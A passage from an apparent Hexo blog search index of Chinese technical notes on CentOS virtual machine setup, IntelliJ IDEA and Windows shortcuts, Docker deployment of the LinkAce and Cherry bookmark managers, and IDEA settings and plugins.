描述：安装虚拟机系统后不需要调整网络，物理网络中的 “路由” 所包含的DHCP服务器会自动识别该虚拟机并为其分配IP地址；\n  如果没有路由，可以自己手动在系统分配，原则是和宿主机在同一网段并指向相同的网关即可通信。\n  ```\n\n- VMNet8\n\n  ```\n  模式：NAT网络模式\n  场景：在宿主机安装多台虚拟机，和宿主组成一个小局域网，宿主机，虚拟机之间都可以互相通信，虚拟机也可访问外网，例如 搭建 hadoop 集群，分布式服务\n  ```\n\n3. 下载虚拟机Centos：https://www.centos.org/download/\n\n==系统基础配置==\n\n- 修改 hotsname\n\n  ```sh\n  hostnamectl --static set-hostname 名称 \n  \n  vi /etc/hostname(缓存？)，要先把这个改好了，下面的配置文件才会生效。 \n  vi  /etc/sysconfig/network（重启，永久） \n  echo hostname > /proc/sys/kernel/hostname（即时生效，临时）\n  ```\n\n- 基础工具安装\n\n  ```sh\n  yum -y install wget   (wget)\n  yum -y install net-tools   (ifconfig)\n  yum -y install lrzsz   (sz和rz)\n  yum -y install tree\n  ```\n\n==虚拟机之间，SSH免密连接==\n\n```\nssh-keygen -t rsa -b 4096\ncd /root/.ssh\nmv id_rsa.pub authorized_keys_master.pub\n\nscp  authorized_keys_node1.pub root@master:/root/.ssh\nscp  authorized_keys_node2.pub root@master:/root/.ssh\n\ncat authorized_keys_master.pub>> authorized_keys\ncat authorized_keys_node1.pub>> authorized_keys\ncat authorized_keys_node2.pub>> authorized_keys\n\nscp authorized_keys  root@node1:/root/.ssh\nscp authorized_keys  root@node2:/root/.ssh\n```\n\n==默认ROOT用户登录==\n\n使用root账户进入系统后，打开`/etc/gdm/custom.conf`文件，在[daemon]下添加两行：\n\n```\nAutomaticLoginEnable=True\nAutomaticLogin=root\n```\n\n==Centos8 时钟同步==\n\n1. cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n\n2. vim /etc/chrony.conf\n\n   ```sh\n   注释掉 \n     pool 2.centos.pool.ntp.org iburst  \n   加入新的的时间服务器\n     server 210.72.145.44 iburst\n     server ntp.aliyun.com iburst\n   ```\n\n3. 重启服务，此时时间已经与网络时间同步\n\n   ```\n   systemctl restart chronyd.service\n   ```\n\n4. 设置开机自启\n\n   ```\n   systemctl enable chronyd.service\n   ```\n\n\n\n==安装图形界面==\n\n\n\n- 命令安装\n\n  ```\n  yum groupinstall \"X Window System\"\n  \n  yum groupinstall \"GNOME Desktop\"\n  ```\n\n- 进入图形界面 \n\n  ```\n  startx 或者 init 5 \n  ```\n\n- 修改图形界面为默认启动方式 \n\n  ```\n  命令行输入命令后重启系统 \n  \n  systemctl set-default graphical.target \n  ```\n\n- 安装中文支持\n\n  ```\n  yum groupinstall \"Chinese Support\" -y \n  ```\n\n- 修改系统默认语言为中文 \n\n  ```\n  命令行输入命令后重启系统\n  \n  localectl set-locale LANG=zh_CN.UTF-8 \n  ```\n\n- 图形界面想要卸载\n\n  ```\n  yum groupremove \"GNOME Desktop Environment\"\n  yum groupremove \"X Window System\"\n  ```\n\n\n\n==问题记录：网络连接图标消失==\n\n- 原因一：查看相关服务是否启动\n\n  进入`计算机管理——>服务`查看这一块是不是有被关闭了的，有的话就开启 \n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/566c0aa61ae444b6984c948fb7c650b1.png) \n\n- 原因二：NetworkManager 未运行\n\n  ```sh\n  # 启动NetworkManager\n  systemctl start NetworkManager\n  # 查看 NetworkManager 的运行状态。 如果显示Active: inactive (dead)，则表示 NetworkManager 未运行。\n  systemctl status NetworkManager\n  # 将 NetworkManager 设为开机自启：\n  systemctl enable NetworkManager\n  # 查看是否开机启动：\n  systemctl is-enabled NetworkManager\n  ```\n\n- 原因三：`NetworkManager 未接管网络（此方法解决）`\n\n  在终端中输入以下命令，查看 NetworkManager 是否接管了网络：`nmcli networking`如果输出 disabled，则表示 NetworkManager 未接管网络，网络图标消失也是由此导致的。\n  这时候查看网卡，会提示“未托管”：\n\n  ```sh\n  [root@localhost ~]# nmcli device status \n  DEVICE      TYPE      STATE   CONNECTION    \n  ens33       ethernet  未托管  -- \n  ```\n\n  连接网卡（以 ens33 网卡为例），会提示失败：\n\n  ```sh\n  [root@localhost ~]# nmcli device connect ens33\n  错误：添加/激活新连接失败：Connection 'ens33' is not available on device ens33 because device is strictly unmanaged\n  ```\n\n  解决办法：只需要一条命令就能搞定，在终端中输入：`nmcli networking on`\n\n","tags":["Linux"],"categories":["Linux","日常使用"]},{"title":"IDEA快捷键","url":"/20250619/610bdf07.html","content":"\n# Editing\n\n| 快捷键                    | 英文说明                                                     | 中文说明                                                     |\n| ------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ~~Ctrl + Space~~ Ctrl + , | Basic code completion (the name of any class, method or variable) | 基本代码完成（任何类、方法或变量的名称）                     |\n| Ctrl + Shift + Space      | Smart code completion (filters the list of methods and variables by expected type) | 智能代码完成（按预期类型筛选方法和变量列表）                 |\n| Ctrl + Shift + Enter      | Complete statement                                           | 完整声明                                                     |\n| Ctrl + P                  | Parameter info (within method call arguments)                | 调用方法时，列出全部参数信息                                 |\n| Ctrl + Q                  | Quick documentation lookup                                   | 光标放在类/方法上，快速显示Java doc 信息                     |\n| Ctrl +hover               | Brief Info                                                   | 鼠标放到类/方法上，提示基本信息                              |\n| Ctrl + F1                 | Show descriptions of error or warning at caret               | 显示光标处的错误或警告的处理提示信息                         |\n| Alt + Insert              | Generate code... (Getters, Setters, Constructors, hashCode/equals, toString) | 弹出可生成代码列表（getter、setter、constructor、hashCode/equals、toString） |\n| Ctrl + O                  | Override methods                                             | 弹出可覆写的方法列表                                         |\n| Ctrl + I                  | Implement methods                                            | 弹出要实现的方法列表                                         |\n| Ctrl + Alt + T            | Surround with…(if..else,try..catch, for,  synchronized, etc.) | 代码块快选（要放在插入点上的代码结束分号上）                 |\n| Ctrl + /                  | Comment/uncomment with line comment                          | 代码行注释                                                   |\n| Ctrl + Shift + /          | Comment/uncomment with block comment                         | 代码块注释                                                   |\n| Ctrl + W                  | Select successively increasing code blocks                   | 选择连续递增的代码块                                         |\n| Ctrl + Shift + W          | Decrease current selection to previous state                 | 取消选择代码块                                               |\n| Alt + Enter               | Show intention actions and quick-fixes                       | 展示意图行动<br/>快速修复                                    |\n| Ctrl + Alt + L            | Reformat code                                                | 代码格式化                                                   |\n| Ctrl + Alt + O            | Optimize imports                                             | 优化类的import                                               |\n| Ctrl + Alt + I            | Auto-indent line(s)                                          | 自动缩进行                                                   |\n| Tab / Shift + Tab         | Indent/unindent selected lines                               | 缩进/取消缩进选定行                                          |\n| Ctrl+X                    | Cut current line or selected block to clipboard              | 将当前行或选定块剪切到剪贴板                                 |\n| Ctrl+C                    | Copy current line or selected block to clipboard             | 将当前行或选定块复制到剪贴板                                 |\n| Ctrl+V                    | Paste from clipboard                                         | 粘贴                                                         |\n| Ctrl+Shift + V            | Paste from recent buffers...                                 | 打开剪贴板，选择要粘贴的内容                                 |\n| Ctrl+D                    | Duplicate current line or selected block                     | 复制并粘贴当前行或选定块                                     |\n| Ctrl+Y                    | Delete line at caret                                         | 删除光标处的行                                               |\n| Ctrl+Shift + J            | Smart line join                                              | 光标所在行和其下一行，或者选择的代码块，合并到一行           |\n| Ctrl+Enter                | Smart line split                                             | 行拆分                                                       |\n| Shift + Enter             | Start new line                                               | 打开新的一行                                                 |\n| Ctrl + Shift + U          | Toggle case for word at caret or selected block              | 在光标所在词语或选定块中切换单词的大小写                     |\n| Ctrl + Shift + ]/[        | Select till code block end/start                             | 选择直到代码块结束/开始                                      |\n| Ctrl + Delete/Backspace   | Delete to word end/start                                     | 删除至单词结束/开始                                          |\n| Ctrl + NumPad+/-          | Expand/collapse code block                                   | 展开/折叠代码块                                              |\n| Ctrl + Shift+NumPad+      | Expand all                                                   | 展开所有代码块                                               |\n| Ctrl + Shift+NumPad-      | Collapse all                                                 | 折叠所有代码块                                               |\n| Ctrl + F4                 | Close active editor tab                                      | 关闭当前活动的编辑窗口                                       |\n| Ctrl + F12                |                                                              | 当前类内搜索方法                                             |\n\n| 快捷键     | 英文说明     | 中文说明     |\n| ---------- | ------------ | ------------ |\n| Alt + Q    | Context info | *上下文信息* |\n| Shift + F1 | External Doc | *外部文件*   |\n\n# Usage Search\n\n| 快捷键             | 英文说明                        | 中文说明                                       |\n| ------------------ | ------------------------------- | ---------------------------------------------- |\n| Alt + F7/Ctrl + F7 | Find usages/Find usages in file | 查找用法/在文件中查找【参数/方法】使用到的地方 |\n| Ctrl + Shift + F7  | Highlight usages in file        | 高亮【参数/方法】使用到的地方                  |\n| Ctrl + Alt + F7    | Show usages                     | 弹出【参数/方法】使用到的列表                  |\n\n# Navigation\n\n| 快捷键                  | 英文说明                                     | 中文说明                                                     |\n| ----------------------- | -------------------------------------------- | ------------------------------------------------------------ |\n| Alt + Right/Left        | Go to next / previous editor tab             | 左边的编辑框/右边的编辑框                                    |\n| F12                     | Go back to previous tool window              | 项目结构中，选中当前文件                                     |\n| Esc                     | Go to editor (from tool window)              | 光标回到编辑栏                                               |\n| Shift + Esc             | Hide active or last active window            | 关闭最新打开的工具栏                                         |\n| Ctrl+Shift+F4           | Close active run / messages / find / ... tab | 关闭活动的工具栏                                             |\n| Ctrl+G                  | Go to line                                   | 跳转到指定行                                                 |\n| Ctrl+E                  | Recent files popup                           | 弹框显示最近使用过的文件                                     |\n| Ctrl+Alt + Left/Right   | Navigate back / forward                      | 后退/前进                                                    |\n| Ctrl+Shift+Backspace    | Navigate to last edit location               | 关闭工具窗口，光标回到最后编辑的文件（类似Esc）              |\n| Alt + F1                | Select current file or symbol in any view    | 选择一个视图，显示当前文件或符号（资源管理器、浏览器、结构图等） |\n| Ctrl + B , Ctrl + Click | Go to declaration                            | 跳转到声明或者用例处                                         |\n| Ctrl + Alt + B          | Go to implementation(s)                      | 跳转到实现处                                                 |\n| Ctrl + Shift + I        | Open quick definition lookup                 | 弹框中查看类文件                                             |\n| Ctrl + Shift + B        | Go to type declaration                       | 跳转类型声明处                                               |\n| Ctrl + Shift + T        |                                              | 转到测试类                                                   |\n| Ctrl + U                | Go to super-method / super-class             | 跳转父方法/父类                                              |\n| Alt + Up/Down           | Go to previous / next method                 | 光标转到前/后一个方法                                        |\n| Ctrl + ]/[              | Move to code block end/start                 | 光标跳转到代码块的结尾/开头                                  |\n| Ctrl + F12              | File structure popup                         | 弹出类结构                                                   |\n| Ctrl + H                | Type hierarchy                               | 打开类型层次结构                                             |\n| Ctrl + Shift + H        | Method hierarchy                             | 打开方法层次结构                                             |\n| Ctrl + Alt + H          | Call hierarchy                               | 打开调用层次结构                                             |\n| F2 / Shift + F2         | Next/previous highlighted error              | 下一个/前一个 error                                          |\n| F4                      | Edit source / View source                    | 编辑/查看文件                                                |\n| Alt + Home              | Show navigation bar                          | 显示代码导航栏                                               |\n| F11                     | Toggle bookmark                              | 加上/去掉书签                                                |\n| Ctrl + F11              | Toggle bookmark with mnemonic                | 添加标记书签                                                 |\n| Ctrl + #[0-9]           | Go to numbered bookmark                      | 转到编号书签                                                 |\n| Shift + F11             | Show bookmarks                               | 弹框，列出书签                                               |\n\n# Search/Replace\n\n| 快捷键                 | 英文说明                  | 中文说明                         |\n| ---------------------- | ------------------------- | -------------------------------- |\n| Double Shift           | Search everywhere         | 搜索任意文件                     |\n| Ctrl + F               | Find                      | 当前文件查找                     |\n| F3 / Shift + F3        | Find next / Find previous | 配合“Ctrl + F” 查找下一个/前一个 |\n| Ctrl + R               | Replace                   | 当前文件替换                     |\n| Ctrl + Shift + F       | Find in pathqu            | 全局查找                         |\n| Ctrl + Shift + R       | Replace in path           | 全局替换                         |\n| Ctrl + N               | Go to class               | 搜索类                           |\n| Ctrl + Shift + N       | Go to file                | 搜索文件                         |\n| Ctrl + Alt + Shift + N | Go to symbol              | 搜索符号                         |\n| Ctrl + Shift + A       | Find Action               | 搜索操作                         |\n\n# Live Templates\n\n| 快捷键         | 英文说明                                        | 中文说明                                                     |\n| -------------- | ----------------------------------------------- | ------------------------------------------------------------ |\n| Ctrl + Alt + J | Surround with Live Template                     |                                                              |\n| Ctrl + J       | Insert Live Template                            | 弹出模板选择需要的代码片段                                   |\n| iter           | Iteration according to Java SDK 1.5 style       | for (Object o : ) {      }                                   |\n| inst           | Checkobjecttype with instanceof and downcast it | if (name instanceof Object) {     Object o = (Object) name;      } |\n| itco           | Iterate elements of java.util.Collection        | for (Iterator iterator = collection.iterator(); iterator.hasNext(); ) {     Object next =  iterator.next();      } |\n| itit           | Iterate elements of java.util.Iterator          | while (iterator.hasNext()) {     Object next =  iterator.next();      } |\n| itli           | Iterate elements of java.util.List              | for (int i = 0; i < list.size(); i++) {     Object o =  list.get(i); |\n| thr            | throw new                                       | throw new                                                    |\n\n# Refactoring：重构\n\n| 快捷键         | 英文说明          | 中文说明                                                     |\n| -------------- | ----------------- | ------------------------------------------------------------ |\n| F5             | Copy              | 复制文件                                                     |\n| F6             | Move              | 移动文件                                                     |\n| Alt + Delete   | Safe Delete       |                                                              |\n| Shift + F6     | Rename            | 重命名（F12 先选中）                                         |\n| Ctrl + F6      | Change Signature  | 更改签名                                                     |\n| Ctrl + Alt + N | Inline            |                                                              |\n| Ctrl + Alt + M | Extract Method    | 提取代码块为一个method                                       |\n| Ctrl + Alt + V | Extract Variable  | 提取变量（定义一个新变量，保留当前变量的值）<br/>修改前：<br/>return name;<br/>修改后：<br/>String name1 = name; <br/>return name1; |\n| Ctrl + Alt + F | Extract Field     | 提取变量为类的一个字段。                                     |\n| Ctrl + Alt + C | Extract Constant  | 提取静态变量                                                 |\n| Ctrl + Alt + P | Extract Parameter | 提取方法入参                                                 |\n|                |                   |                                                              |\n\n# Debugging\n\n| 快捷键                  | 英文说明                 | 中文说明            |\n| ----------------------- | ------------------------ | ------------------- |\n| F7 / F8                 | Step into / Step over    | 步入/步出（F5/F6）  |\n| Shift + F7 / Shift + F8 | Smart step into/Step out |                     |\n| Alt + F9                | Run to cursor            | 跑到下一断点        |\n| Alt + F8                | Evaluate expression      | 计算表达式          |\n| F9                      | Resume program           | 重新开始程序（F11） |\n| Ctrl + F8               | Toggle breakpoint        | 加上/去掉 断点      |\n| Ctrl + Shift + F8       | View breakpoints         | 查看断点            |\n\n# Compile and Run\n\n| 快捷键               | 英文说明                                     | 中文说明                |\n| -------------------- | -------------------------------------------- | ----------------------- |\n| Ctrl + F9            | Make project (compile modifed and dependent) | 构建项目                |\n| Ctrl + Shift + F9    | Compile selected file, package or module     | 重新编译                |\n| Alt + Shift + F10/F9 | Select configuration and run/and debug       | 打开run/debug的配置文件 |\n| Shift + F10/F9       | Run/Debug                                    | Run/Debug 程序          |\n| Ctrl + Shift + F10   | Run context configuration from editor        | 从编辑器运行上下文配置  |\n| Ctrl + F2            |                                              | stop 程序               |\n\n# VCS/Local History\n\n| 快捷键              | 英文说明              | 中文说明             |\n| ------------------- | --------------------- | -------------------- |\n| Ctrl + K            | Commit project to VCS | 提交                 |\n| Ctrl + T            | Update from VCS       | 更新                 |\n| Alt + Shift + C     | View recent changes   | 打开最近变更内容列表 |\n| Alt + BackQuote (`) | VCS Operations Popup  | 弹出版本控制选项框   |\n\n# General\n\n| 快捷键                 | 英文说明                                  | 中文说明                            |\n| ---------------------- | ----------------------------------------- | ----------------------------------- |\n| Alt + #[0-9]           | Open corresponding tool window            | 打开相应的工具窗口                  |\n| Ctrl + S               | Save all                                  | 保存                                |\n| Ctrl + Alt + Y         | Synchronize                               | 同步（reload）                      |\n| Ctrl + Shift + F12     | Toggle maximizing editor                  | 最大化/恢复 编辑窗口                |\n| Alt + Shift + F        | Add to Favorites                          | 添加收藏                            |\n| Alt + Shift + I        | Inspect current file with current profile | 使用当前配置文件检查当前文件        |\n| Ctrl + BackQuote (`)   | Quick switch current scheme               | 切换IDEA主题模式                    |\n| Ctrl + Alt + S         | Open Settings dialog                      | 打开设置                            |\n| Ctrl + Alt + Shift + S | Open Project Structure dialog             | 打开项目结构                        |\n| Ctrl + Tab             | Switch between tabs and tool window       | 打开切换器（类似于windows的任务栏） |\n\n\n\n\n\n# 查看当前类的父类（Ctrl+Alt+Shift+u）\n\n下面看这个编辑器怎么以图解的形式，查看这种继承关系。\n\n![image-20211127223845078](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211127223845078-1749027383874-4.png)   \n\n ![image-20211127223909961](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211127223909961-1749027383875-8.png) \n\n\n\n# 打开子类工具栏：F4\n\n利用的： 顶部菜单 `Navigate --> Type Hierarchy`\n\n# 弹出子类UML图：Ctrl+Alt+u\n\n ![image-20211127224042688](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211127224042688-1749027383875-10.png)  \n\n设置相关快捷键\n\n![image-20211127225955330](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211127225955330-1749027383875-6.png)  \n\n# 弹出层显示的记录文件个数（Ctrl + E）\n\n![image-20211127231134179](D:/_NoteSpace/Hexo/hmxyl/source/_images/image-20211127231134179-1749027383875-12.png)   \n\n\n\n# 行拷贝（Ctrl+Alt+⬇）\n\n Duplicate Line Or Selection\n\n![30f63f77a3c8b29426f7f6411d13f4b9.png](D:/_NoteSpace/Hexo/hmxyl/source/_images/clip_image002-16380260866347-1678439895424-11-1749027383875-14.png)  \n\n\n\n\n\n","tags":["快捷键"],"categories":["IDEA","快捷键"]},{"title":"Windows快捷键","url":"/20250619/459f9e41.html","content":"\n\n\n# Windows快捷键\n\n## win+r 可执行的命令\n\n| 命令         | 说明             |\n| ------------ | ---------------- |\n| mstsc        | 打开远程连接     |\n| services.msc | 本地服务设置     |\n| calc         | 计算器           |\n| dxdiag       | 查看系统配置命令 |\n| regedit      | 注册表           |\n\n\n\n## Windows系统快捷键记录\n\n| **说明**                                       | **快捷键**     |\n| ---------------------------------------------- | -------------- |\n| 打开任务管理器                                 | Ctrl+Shift+Esc |\n| 取消当前任务                                   | Esc            |\n| 永久删除所选的项目（删除之后无法从回收站还原） | Shift+delete   |\n| 在选项卡上向后移动                             | Ctrl+shiff+tab |\n| 在选项上向后移动                               | Tab            |\n| 在选项卡上向前移动                             | Shift+Tab      |\n\n## Windows资源管理器中的快捷键\n\n| **快捷键** | **说明**                   |\n| ---------- | -------------------------- |\n| Alt+P      | 显示预览窗格               |\n| Alt+←      | 切换到前一次打开的文件夹   |\n| Alt+→      | 切换到下一次后打开的文件夹 |\n| Alt+↑      | 打开上层文件夹             |\n| Backspace  | 打开上层文件夹             |\n\n## Windows徽标键相关的快捷键\n\n| **快捷键**  | **说明**                         |\n| ----------- | -------------------------------- |\n| Win         | 打开或者关闭开始菜单             |\n| Win+Pause   | 显示系统属性对话框               |\n| Win+d       | 显示桌面                         |\n| Win+m       | 最小化所有窗口                   |\n| Win+Shift+m | 还原最小化窗口到桌面上           |\n| Win+E       | 打开我的电脑                     |\n| Win+F       | 搜索文件或文件夹                 |\n| Win+L       | 锁定您的计算机或切换用户         |\n| Win+R       | 打开运行对话框                   |\n| Win+↓       | 最小化窗口                       |\n| Win+↑       | 最大化当前窗口                   |\n| Win+←       | 最大化到窗口左侧的屏幕上         |\n| Win+→       | 最大化到窗口右侧的屏幕上         |\n| Win+home    | 最小化所有窗口，除了当前激活窗口 |\n\n","tags":["快捷键"],"categories":["Windows系统","快捷键"]},{"title":"LinkAce书签管理器","url":"/20250619/7f395aef.html","content":"\n\n\n# [Docker安装LinkAce](https://www.linkace.org/docs/v2/setup/setup-with-docker/)\n\n- 磁盘路径准备\n\n~~~sh \n# 磁盘数据\ntouch docker-compose.yml\nmkdir linkace & cd linkace \ntouch .env\nmkdir database & mkdir backups & cd database\n# 数据库配置(sqlite数据库)\ntouch database.sqlite\nchmod 0766 database.sqlite\n~~~\n\n- .env文件\n\n> ```\n> ## LINKACE CONFIGURATION\n> \n> ## Basic app configuration\n> # The app key is generated later, please leave it like that\n> APP_KEY=base64:QaxDvW3pmdJxmPNITFBJHf82JyUn+rK0AUtQTT1jM5c=\n> \n> ## Configuration of the database connection\n> # Set the database driver (mysql, pgsql, sqlsrv, sqlite)\n> DB_CONNECTION=sqlite\n> # Set the database name (MySQL, Postgres,...) or path (SQLite) here\n> DB_DATABASE=/app/database/database.sqlite\n> ```\n\n- docker-compose.yml文件\n\n> ```\n> services:\n>   linkace:\n>     container_name: linkace\n>     image: linkace/linkace:latest\n>     volumes:\n>       - ./linkace/.env:/app/.env\n>       - ./linkace/database/database.sqlite:/app/database/database.sqlite\n>     environment:\n>       - PORT=8080\n>     ports:\n>       - \"8080:8080\"\n>     restart: unless-stopped\n>     networks:\n>       - hots\n> networks:\n>   hots:\n>     driver: bridge\n> ```\n","categories":["应用推荐"]},{"title":"Cherry书签管理器","url":"/20250619/b78998f1.html","content":"\n# 官网地址\n\nhttps://cherry.haishan.me/docs/deploy\n\nhttps://github.com/sissbruecker/linkding\n\n# Docker上安装\n\n- 参数说明\n\n| 参数                         | 值                                           |\n| ---------------------------- | -------------------------------------------- |\n| `JWT_SECRET`                 | 加密因子。用 `openssl rand -hex 位数` 来生成 |\n| `ENABLE_PUBLIC_REGISTRATION` | 是否启用注册，默认为 `0`                     |\n| `USE_INSECURE_COOKIE`        | 设置 `1` 为暂时禁用 `Secure cookie`          |\n\n> - `JWT_SECRET`（必需的）：此字符串将用于签署用户的 `PAT`（个人访问令牌）。`PAT` 采用 `JWT`（`JSON Web Token`）格式，用于验证和识别 `Cherry` 用户。您应该将`JWT_SECRET`保密，以防止他人伪造令牌。\n> - `ENABLE_PUBLIC_REGISTRATION` ：此值确定是否从外部（您的 `Cherry Docker` 容器实例）启用注册。将其设置 `1` 为启用注册。默认情况下，或使用其他值，注册被禁用。您很可能希望在全新部署后启用注册，并在创建用户后立即禁用它。\n> - `USE_INSECURE_COOKIE`：默认情况下，`Cherry` 使用仅适用于 `HTTPS` 的 `Secure cookie` 。但是，如果您想尝试在本地主机上运行 `Cherry`，您可以将此环境变量设置 `1` 为暂时禁用 `Secure cookie`，否则您可能无法登录。\n\n```yml\nversion: '3'\n\nservices:\n  cherry:\n    image: haishanh/cherry:latest\n    container_name: cherry\n    ports:\n      - 5150:8000\n    volumes:\n      - ./cherry:/data\n    environment:  \n      - USE_INSECURE_COOKIE:1\n      - JWT_SECRET=some-some-secret-string \n    restart: unless-stopped\n```\n\n- 用户操作（容器创建之后创建用户）\n\n```sh\n# 创建用户\ndocker exec cherry cherry create-user <email> <password>\n# 更新现有用户密码\ndocker exec cherry cherry update-user-password <email> <newPassword>\n# 删除用户\ndocker exec cherry cherry delete-user <id> <email>\n\n```\n\n```sh\n # 数据目录为1001用户权限（磁盘数据迁移需要使用到）\n chown 1001 /opt/hots_data/cherry -R\n```\n\n","categories":["应用推荐"]},{"title":"压测工具概述","url":"/20250619/e291c7ca.html","content":"\n\n\nJMeter\n\nJava 微基准测试（JMH）\n\nAB (Apache Benchmark)\n\n几种性能测试工具的总结 - Thoughtworks洞见：https://insights.thoughtworks.cn/performance-testing-tools/","tags":["测试"],"categories":["工具|部署","压测"]},{"title":"IDEA配置","url":"/20250619/1a8c2722.html","content":"\n# 编码配置\n\n## 全局编码\n\n![57826dd953a5c863292bed5462025d60.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-163802678409512.png)   \n\n## 文件编码\n\n打开需要设置编码的文件，在右下角进行设置\n\n## 编码统一\n\n### File Encodings\n\n ![image-20211125093711347](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125093711347.png)\n\n\n\n# 文件默认打开方式\n\n![fce0704d161bda7eec8a5cc4743cc062.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380266644219.png)   \n\n如上图标注 1 所示，该区域的后缀类型文件在 IntelliJ IDEA 中将以标注 2 的方式进行打开。\n\n如上图标注 3 所示，我们可以在 IntelliJ IDEA 中忽略某些后缀的文件或是文件夹，比如我一般会把 .idea 这个文件夹忽略。\n\n\n\n \n\n# 字体设置\n\n## 界面字体\n\nSettings->Appearance\n\n![e8ad5d669969dbce8a1e35d6269013df.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-163802676145910.png) \n\n## 程序字体\n\nEditor -> Colors & Fonts -> Font\n\n![5e3013e5dad6b0e05e97274216472a90.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802676145911.png) \n\n\n\n# 代码注释\n\n\n\n## 修改类注释模板\n\n`File->Settings->File and Code Templates 找到Includes`\n\n\n\n## 单行注释、注释块\n\n搜索：`Add a space at line comment start`\n\n![image-20220304151518515](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220304151518515-1678442134982-139.png)\n\n\n\n# 代码提示\n\n##  代码提示快捷键（Ctrl+逗号）\n\n如图所示，默认` Ctrl + 空格` 快捷键是`基础代码提示、补充`快捷键，但是由于我们中文系统基本这个快捷键都被输入法占用了，\n\n所以我们发现不管怎么按都是没有提示代码效果的，原因就是在此。我个人建议修改此快捷键为` Ctrl + 逗号`。\n\n![image-20211127232203726](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127232203726-1678441234800-133.png)   \n\n## 鼠标放上去提示参数\n\n![0e6d5bfa29683800dc3eae4602afc8a8.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802681052513-1678440029357-19.png)   \n\n \n\n\n\n# 代码格式化\n\n## 格式化代码后，多行空行转为一行\n\nidea格式化代码后会出现最多2行空行，不能像eclipse一样最多只保留一行空行，要想设置的和eclipse效果一样，设置如下\n\nFile --> setting --> 搜索 code style --> 选择 blank lines标签项 --> 保留最大空行数设置为1\n\n![image-20211127230244828](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230244828-1678442048160-136.png)  \n\n\n\n# 代码查看窗口\n\n## 软分行查看代码\n\n右键\n\n  ![9fff17978c4752eeb8d4c127c9e2a554.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-1678440029363-29.png)  \n\n## 文件打开列表超过一行，放多行显示\n\n![image-20211127230844516](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230844516-1678442240545-142.png)  \n\n\n\n如上图标注 1 所示，在打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的文件名 Tab 单行显示的。可以修改为多行 \n\n\n\n\n\n## 默认代码展示形式（折叠/展开）\n\n我们可以对指定代码类型进行默认折叠或是展开的设置，勾选上的表示该类型的代码在文件被打开的时候默认是被折叠的，去掉勾选则反之。\n\n ![image-20230310180729245](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310180729245.png) \n\n\n\n## 行号和方法分割线\n\n默认 IntelliJ IDEA 是没有勾选 `Show line numbers` 显示行数的，但是我建议一般这个要勾选上。\n\n默认 IntelliJ IDEA 是没有勾选` Show method separators` 显示方法线的，这种线有助于我们区分开方法，所以也是建议勾选上的。\n\n![2c9d0deb2e32bea240016e879acd4cb7.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-1678442240552-146.png)  \n\n\n\n\n\n\n## 增加打开的文件 Tab 个数\n\nTab limit\n\n![3a13ec2347321bd1c23131c75e5f6808.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380259713575-1678442240553-150.png)   \n\n\n\n## 单文件多窗口打开\n\n![a1f9f345240dd5190a929ffc0fe14de1.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380260699266-1678442240553-152.png)   \n\n\n\n## 默认隐藏注释\n\n![image-20230207181024546](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207181024546.png) \n","tags":["IDEA"],"categories":["工具|部署","IDEA"]},{"title":"IDEA插件","url":"/20250619/ee604b16.html","content":"\n# CamelCase\n\n使用快捷键转换驼峰、下划线等命名规则\n\n![image-20211125092234688](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092234688-1671159524636-1.png)  \n\n光标放在要修改的名称上（如：变量名，或者mapper.xml里的字段名,会自动识别光标所在单词），按control+alt+U,则进行按命名规则进行转换，会按配置中选择的命名规则列表来回切换。 \n\n如图，如果只选择了CamelCase to camelCase、camelCase to snake_case，则可以在两者之间来回切换，适合公司对命名的要求。\n\n![image-20211125092300247](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092300247-1671159524637-3.png)  \n\n\n\n# RestfulToolkit\n\n<!--  API查找工具 --> \n\n![image-20211125092703437](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092703437-1671159524637-9.png)  \n\n# Free Mybatis plugin\n\n<!-- 快速从代码跳转到mapper及从mapper返回代码-->\n\n\n\n# EasyCode\n\n代码生成插件\n\n1. 下载插件，安装后重启\n\n   ![image-20211125092413929](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092413929-1671159524637-5.png) \t\n\n2. 在idea右侧选择Database，选择自己的数据库\n\n   ![image-20211125092433296](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092433296-1671159524637-7.png) \n\n3. 输入账号密码，连接成功\n\n   ![image-20211125092518334](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092518334-1671159524637-11.png) \n\n4. 选择自己所需的表，鼠标右键->EasyCode->Generate Code\n\n   ![image-20211125092538684](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092538684-1671159524637-13.png)  \n\n5. 选择自己需要生成的，勾选，然后OK就行\n\n   ![image-20211125092616622](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092616622-1671159524637-15.png)  \n\n6. 